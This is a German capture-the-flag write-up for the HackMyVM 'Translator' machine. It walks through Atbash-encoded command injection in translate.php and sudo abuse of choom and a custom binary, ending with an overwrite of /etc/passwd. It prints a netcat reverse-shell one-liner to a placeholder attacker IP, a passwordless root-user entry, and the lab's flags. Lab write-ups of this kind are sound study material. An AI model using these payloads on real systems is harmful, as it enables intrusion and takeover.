# Translator - HackMyVM (Easy)
 
![Translator.png](Translator.png)

## Übersicht

*   **VM:** Translator
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Translator)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 11. Mai 2022
*   **Original-Writeup:** https://alientec1908.github.io/Translator_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Translator"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem eine Datei `translate.php` gefunden wurde. Diese Datei war anfällig für Command Injection: Die Benutzereingabe über den GET-Parameter `hmv` wurde zuerst mit einer Atbash-Chiffre verarbeitet und dann unsicher in einem `system()`-Aufruf verwendet. Durch eine Atbash-kodierte Reverse-Shell-Payload wurde initialer Zugriff als `www-data` erlangt. Als `www-data` wurde eine Datei `hvxivg` (Atbash für `script`) gefunden, deren Inhalt (`Mb kzhhdliw rh zbfie3w4` -> Atbash für `My password is ayurv3d4`) das Passwort für den Benutzer `ocean` offenbarte. Nach dem Wechsel zu `ocean` zeigte `sudo -l`, dass `/usr/bin/choom` als Benutzer `india` ausgeführt werden durfte. Dies wurde genutzt, um eine Shell als `india` zu erhalten. Schließlich erlaubte eine weitere `sudo`-Regel dem Benutzer `india`, `/usr/local/bin/trans` als `root` auszuführen. Dieses Programm wurde missbraucht, um `/etc/passwd` mit einem Eintrag für einen neuen Root-Benutzer (`hacker`) zu überschreiben, was den direkten Login als `root` ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `nmap`
*   `gobuster`
*   Web Browser (für Interaktion und Tests)
*   `tr` (via RCE, impliziert durch Atbash-Verarbeitung serverseitig)
*   Atbash Cipher Decoder (z.B. dcode.fr, impliziert)
*   `nc` (netcat)
*   `find`
*   `cat`
*   `su`
*   `sudo`
*   `choom`
*   `cp`
*   `nano` (oder anderer Texteditor)
*   `trans` (Custom Binary)
*   `ssh`
*   Standard Linux-Befehle (`ls`, `cd`, `id`, `pwd`, `export`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Translator" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   *Ein initialer `arp-scan` wurde im Original-Writeup erwähnt, aber für diese Readme wird der Nmap-Scan als Startpunkt genommen.*
    *   `nmap`-Scan auf `192.168.2.113` identifizierte offene Ports: 22 (SSH - OpenSSH 8.4p1) und 80 (HTTP - Nginx 1.18.0).
    *   `gobuster` auf Port 80 fand `/index.html` und die entscheidende Datei `/translate.php`.
    *   Manuelle Tests mit `translate.php` und dem Parameter `hmv` zeigten, dass die Eingabe mit einer Atbash-Chiffre verarbeitet und anschließend in einem Shell-Befehl verwendet wird (Command Injection). Z.B. `hmv=rw;` wurde zu `id;` ausgeführt.

2.  **Initial Access (RCE via Atbash-kodierter Payload zu `www-data`):**
    *   Erstellung einer Bash-Reverse-Shell-Payload (z.B. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Angreifer-IP] 1234 >/tmp/f`).
    *   Atbash-Kodierung dieser Payload (z.B. zu `in /gnk/u;npurul /gnk/u;xzg /gnk/u|/yrm/hs -r 2>&1|mx [Angreifer-IP] 1234 >/gnk/u`).
    *   Starten eines `nc`-Listeners auf dem Angreifer-System (Port 1234).
    *   Senden der Atbash-kodierten Payload über den `hmv`-Parameter an `translate.php`.
    *   Erlangung einer interaktiven Shell als `www-data` nach Analyse des Quellcodes von `translate.php` (bestätigte `system('echo '.$test.'| tr ...')`).

3.  **Privilege Escalation (von `www-data` zu `ocean`):**
    *   Im Verzeichnis `/var/www/html` wurde die Datei `hvxivg` gefunden.
    *   `cat hvxivg` zeigte `Mb kzhhdliw rh zbfie3w4`.
    *   Atbash-Dekodierung ergab: "My password is ayurv3d4".
    *   Wechsel zum Benutzer `ocean` mittels `su ocean` und dem Passwort `ayurv3d4`.

4.  **Privilege Escalation (von `ocean` zu `india` via `sudo choom`):**
    *   `sudo -l` als `ocean` zeigte: `(india) NPASSWD: /usr/bin/choom`.
    *   Ausführung von `sudo -u india /usr/bin/choom -n 1 bash`.
    *   Erlangung einer Shell als Benutzer `india`.

5.  **Privilege Escalation (von `india` zu `root` via `sudo trans` und `/etc/passwd` Manipulation):**
    *   User-Flag `a6765hftgnhvugy473f` in `/home/ocean/user.txt` gelesen (als `india` oder `root`).
    *   `sudo -l` als `india` zeigte: `(root) NPASSWD: /usr/local/bin/trans`.
    *   Erstellung einer manipulierten Passwortdatei (`/dev/shm/file`) mit einem Eintrag für einen neuen Root-Benutzer (z.B. `hacker::0:0:hacker:/root:/bin/bash`).
    *   Ausnutzung von `trans` zum Überschreiben von `/etc/passwd`: `sudo -u root /usr/local/bin/trans -i /dev/shm/file -o /etc/passwd -no-auto`.
    *   Wechsel zum neuen Root-Benutzer `hacker` mittels `su hacker` (ohne Passwort oder mit bekanntem, falls Hash gesetzt wurde).
    *   Erlangung einer Root-Shell.
    *   Root-Flag `h87M5364V2343ubvgfy` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Command Injection nach Chiffrierung:** Die Webanwendung (`translate.php`) verarbeitete Benutzereingaben mit einer Atbash-Chiffre und übergab das Ergebnis unsicher an einen `system()`-Aufruf.
*   **Klartext-Passwort in Datei (Atbash-verschleiert):** Ein Passwort wurde in einer Datei gespeichert, deren Inhalt und Name Atbash-kodiert waren.
*   **Unsichere `sudo`-Konfiguration (`choom`):** Die Erlaubnis, `choom` (das Befehle starten kann) als anderer Benutzer auszuführen, ermöglichte einen Benutzerwechsel.
*   **Unsichere `sudo`-Konfiguration (`trans`):** Die Erlaubnis, ein benutzerdefiniertes Programm (`trans`) als `root` auszuführen, das beliebige Dateien überschreiben konnte, ermöglichte die Manipulation von `/etc/passwd`.
*   **Manipulation von `/etc/passwd`:** Hinzufügen eines neuen Benutzers mit UID 0 zur Erlangung von Root-Rechten.

## Flags

*   **User Flag (`/home/ocean/user.txt`):** `a6765hftgnhvugy473f`
*   **Root Flag (`/root/root.txt`):** `h87M5364V2343ubvgfy`

## Tags

`HackMyVM`, `Translator`, `Easy`, `Command Injection`, `Atbash Cipher`, `RCE`, `sudo Exploitation`, `choom`, `Custom Binary Exploitation`, `/etc/passwd`, `Privilege Escalation`, `Linux`, `Web`
